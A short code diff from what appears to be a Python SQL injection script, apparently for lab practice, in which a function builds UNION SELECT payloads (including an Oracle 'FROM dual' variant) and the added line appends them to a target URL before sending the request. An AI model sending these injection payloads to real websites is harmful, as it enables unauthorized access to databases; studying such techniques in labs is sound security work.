@@ -70,6 +70,7 @@ def determine_text_columns(url, no_proxy, num_columns, oracle=False):
             category = f"' UNION SELECT {nulls} FROM dual-- "
         else:
             category = f"' UNION SELECT {nulls}-- "
+        exploit_url = url + category
         if no_proxy: 
             resp = requests.get(exploit_url)
         else: 
